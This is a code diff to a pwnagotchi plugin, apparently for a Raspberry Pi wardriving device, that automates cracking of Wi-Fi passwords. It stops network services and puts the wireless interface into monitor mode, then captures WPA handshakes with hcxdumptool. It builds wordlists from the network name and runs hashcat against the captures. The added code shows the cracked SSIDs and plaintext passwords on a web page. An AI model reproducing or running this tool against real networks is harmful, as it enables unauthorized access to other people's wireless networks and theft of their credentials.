@@ -12,7 +12,7 @@ import pwnagotchi.plugins as plugins
 from pwnagotchi.utils import StatusFile
 from json.decoder import JSONDecodeError
 
-crackable__re = re.compile(
+crackable_re = re.compile(
     r'\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))'
 )
 
@@ -103,17 +103,22 @@ TEMPLATE = """
 {% endblock %}
 {% block content %}
     <input type="text" id="searchText" placeholder="Search for ..." title="Type in a filter">
+    <div id="progressStatus" style="display: none;">
+        <p id="progressMessage">Cracking in progress...</p>
+    </div>
     <table id="tableOptions">
         <tr>
             <th>SSID</th>
             <th>BSSID</th>
             <th>Password</th>
+            <th>Status</th>
         </tr>
         {% for p in passwords %}
             <tr>
                 <td data-label="SSID">{{p["ssid"]}}</td>
                 <td data-label="BSSID">{{p["bssid"]}}</td>
                 <td data-label="Password">{{p["password"]}}</td>
+                <td data-label="Status">{{p["status"]}}</td>
             </tr>
         {% endfor %}
     </table>
@@ -137,11 +142,6 @@ class RulesDic(plugins.Plugin):
         self.counter = 0
 
     def _load_status_file(self):
-        """
-        Load the status file. If it fails due to JSONDecodeError, remove the corrupted file and create a new one.
-        Returns:
-            StatusFile: The loaded or newly created status file.
-        """
         try:
             return StatusFile('/root/handshakes/.rulesdic', data_format='json')
         except JSONDecodeError:
@@ -171,7 +171,7 @@ class RulesDic(plugins.Plugin):
 
     def on_config_changed(self, config):
         self.options['handshakes'] = config['bettercap']['handshakes']
-
+        
     def on_handshake(self, agent, filename, access_point, client_station):
         if not self.running:
             return
@@ -206,38 +206,51 @@ class RulesDic(plugins.Plugin):
         display.set('face', self.options['face'])
         display.set('status', 'Handshake found')
         logging.info('[RulesDic] Handshake confirmed')
+
+        display.set('status', 'Cracking in progress...')
+        self.update_progress_status(filename, 'Cracking in progress...')
+
         pwd = self.try_to_crack(filename, essid, bssid)
         duration = (datetime.now() - current_time).total_seconds()
 
         if not pwd:
             display.set('face', self.options['face'])
-            display.set('status', r'Password not found for {essid} :\'()')
+            display.set('status', f'Password not found for {essid} :\'()')
+            self.update_progress_status(filename, 'Password not found')
             logging.warning(
                 f'!!! [RulesDic] !!! Key not found for {essid} in {duration // 60:.0f}min and {duration % 60:.0f}s')
         else:
             display.set('face', self.options['face'])
-            display.set('status', r'Password cracked for {essid} :\'()')
+            display.set('status', f'Password cracked for {essid} :\'()')
+            self.update_progress_status(filename, 'Password cracked')
             logging.warning(
                 f'!!! [RulesDic] !!! Cracked password for {essid}: {pwd}. Found in {duration // 60:.0f}min and {duration % 60:.0f}s')
 
         reported.append(filename)
         self.report.update(data={'reported': reported, 'excluded': excluded})
 
+    def update_progress_status(self, filename, status):
+        try:
+            passwords = []
+            cracked_files = pathlib.Path('/home/pi/handshakes/').glob('*.cracked')
+            for cracked_file in cracked_files:
+                ssid, bssid = re.findall(r"(.*)_([0-9a-f]{12})\.", cracked_file.name)[0]
+                with open(cracked_file, 'r') as f:
+                    pwd = f.read()
+                passwords.append({"ssid": ssid, "bssid": bssid, "password": pwd, "status": status})
+            return render_template_string(TEMPLATE, title="Passwords list", passwords=passwords)
+        except Exception as e:
+            logging.error(f"[RulesDic] error while updating progress status: {e}")
+            logging.debug(e, exc_info=True)
+    
     def check_handcheck(self, filename, interface='wlan0mon'):
-        """
-        Check for handshakes with the given filename and interface.
-        Stops interfering processes and ensures the interface is up and in monitor mode.
-        """
-        # Stop interfering processes
         subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'])
         subprocess.run(['sudo', 'systemctl', 'stop', 'wpa_supplicant'])
         
-        # Ensure the interface is up and in monitor mode
         subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'])
         subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'type', 'monitor'])
         subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
         
-        # Run hcxdumptool for a longer duration and with additional options
         command = f'nice /usr/bin/hcxdumptool -i {interface} -o {filename}.pcapng --active_beacon --enable_status=15 --filtermode=2 --disable_deauthentication'
         hcxdumptool_execution = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         result = hcxdumptool_execution.stdout.decode('utf-8').strip()
@@ -262,10 +275,6 @@ class RulesDic(plugins.Plugin):
         return handshake_match
 
     def try_to_crack(self, filename, essid, bssid):
-        """
-        Try to crack the password using hashcat.
-        Generates a wordlist based on the ESSID and runs hashcat with the generated wordlist.
-        """
         wordlist_filename = self._generate_dictionnary(filename, essid)
         command = f'nice /usr/bin/hashcat -m 22000 {filename}.pcapng -a 0 -w 3 -o {filename}.cracked {wordlist_filename}'
         subprocess.run(command, shell=True, stdout=subprocess.PIPE)
@@ -276,10 +285,6 @@ class RulesDic(plugins.Plugin):
         return None
 
     def _generate_dictionnary(self, filename, essid):
-        """
-        Generate a dictionary based on the ESSID.
-        Applies various rules such as reverse, punctuation, years, and leet transformations.
-        """
         wordlist_filename = os.path.join(self.options['tmp_folder'], f"{os.path.splitext(os.path.basename(filename))[0]}.txt")
         logging.info(f'[RulesDic] Generating {wordlist_filename}')
         essid_bases = self._essid_base(essid)
